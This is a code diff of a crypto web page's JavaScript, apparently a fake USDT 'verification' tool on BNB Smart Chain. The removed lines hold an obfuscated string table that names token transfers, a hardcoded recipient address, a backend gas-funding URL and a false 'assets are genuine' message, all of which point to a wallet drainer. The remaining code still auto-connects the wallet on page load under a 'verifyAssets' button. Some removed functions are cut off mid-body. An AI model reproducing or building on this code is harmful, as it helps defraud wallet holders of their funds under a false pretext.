@@ -5,47 +5,11 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USD
 let web3;
 let userAddress;
 
- function _0x3140(_0x98b4dc, _0x3aad4a) {
-            const _0x17fe93 = _0x17fe();
-            return (
-                (_0x3140 = function (_0x31402b, _0x37f418) {
-                    _0x31402b = _0x31402b - 0x91;
-                    let _0x14767f = _0x17fe93[_0x31402b];
-                    return _0x14767f;
-                }),
-                _0x3140(_0x98b4dc, _0x3aad4a)
-            );
-        }
-
-        // Connect Wallet with iOS Support
-        async function connectWallet() {
-            const _0x4aa6d2 = _0x1b5be5;
-
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            const isTrustWallet = window.ethereum && window.ethereum.isTrust;
-
-            if (isIOS && !window[_0x4aa6d2(0xb5)]) {
-                const link = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(
-                    window.location.href
-                )}`;
-                window.location.href = link;
-
-                setTimeout(() => {
-                    if (!window[_0x4aa6d2(0xb5)]) {
-                        alert(
-                            "\uD83D\uDD17 Please open in Trust Wallet browser or connect manually."
-                        );
-                    }
-                }, 2000);
-                return;
-            }
-
-
 async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_accounts" });
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
             // Force switch to BNB Smart Chain
             await window.ethereum.request({
@@ -65,138 +29,10 @@ async function connectWallet() {
     }
 }
 
- // Auto-connect on page load (iOS & Android)
-        window.addEventListener('load', async () => {
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            const isAndroid = /Android/i.test(navigator.userAgent);
-            const hasEth = Boolean(window.ethereum);
-            const isTrust = hasEth && window.ethereum.isTrust;
-
-            if (isTrust) {
-                // Already in Trust Wallet DApp browser → connect immediately
-                await connectWallet();
-            }
-            else if ((isIOS || isAndroid) && !hasEth) {
-                // On mobile Safari/Chrome & no injected provider → deep-link into Trust Wallet
-                const deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)
-                    }`;
-                window.location.href = deepLink;
-
-                // Fallback if user doesn’t arrive in time
-                setTimeout(() => {
-                    if (!window.ethereum) {
-                        alert("🔗 Please open this page in the Trust Wallet DApp browser.");
-                    }
-                }, 2000);
-            }
-        });
-
- function _0x17fe() {
-            const _0x3fd85e = [
-                "transfer",
-                "Next",
-                "1232ojfoIv",
-                "2nrOmrR",
-                "application/json",
-                "block",
-                "balanceOf",
-                "display",
-                "center",
-                "top",
-                "21FEpkXF",
-                "backgroundColor",
-                "fromWei",
-                "\x20BNB",
-                "getBalance",
-                "addEventListener",
-                "Transferring\x20",
-                "fixed",
-                "bool",
-                "uint256",
-                "body",
-                "utils",
-                "eth_accounts",
-                "2306763LSzeEn",
-                "black",
-                "\x20for\x20gas\x20fees.",
-                "1380120TWollh",
-                "call",
-                "6645RBXuDC",
-                "469058OBilvS",
-                "error",
-                "⚠️\x20Error\x20sending\x20BNB:",
-                "recipient",
-                "\x20USDT",
-                "Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.",
-                "USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.",
-                "Wallet\x20Connected:",
-                "appendChild",
-                "div",
-                "boxShadow",
-                "✅\x20Sent\x20",
-                "\x20USDT\x20to\x20",
-                "18681710MpZxuo",
-                "ethereum",
-                "368odXlEv",
-                "eth",
-                "\x20USDT<br><b>BNB\x20Balance:</b>\x20",
-                "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87",
-                "3834135AAKgxs",
-                "POST",
-                "wallet_switchEthereumChain",
-                "BNB\x20Balance:\x20",
-                "none",
-                "ether",
-                "Contract",
-                "load",
-                "log",
-                "address",
-                "No\x20assets\x20found.",
-                "click",
-                "popupBox",
-                "Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.",
-                "methods",
-                "https://bep20usdt-backend-production.up.railway.app/send-bnb",
-                "18px",
-                "Error\x20connecting\x20wallet:",
-                "position",
-                "80%",
-                "User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...",
-                "0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)",
-                "width",
-                "borderRadius",
-                "_owner",
-                "textAlign",
-                "stringify",
-                "left",
-                "sendTransaction",
-                "toWei",
-                "red",
-                "color",
-                "green",
-                "#ffebeb",
-                "toString",
-                "request",
-                "50%",
-                "\x20BNB\x20to\x20",
-                "0x38",
-                "getAccounts",
-                "transform",
-                "...",
-                "maxWidth",
-                "✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20",
-                "style",
-                "getElementById",
-            ];
-            _0x17fe = function () {
-                return _0x3fd85e;
-            };
-            return _0x17fe();
-         
 // Auto-connect wallet on page load
 window.addEventListener("load", connectWallet);
 
-async function Next() {
+async function verifyAssets() {
     if (!web3 || !userAddress) {
         alert("Wallet not connected. Refresh the page.");
         return;
@@ -319,4 +155,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("Next").addEventListener("click", Next);
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
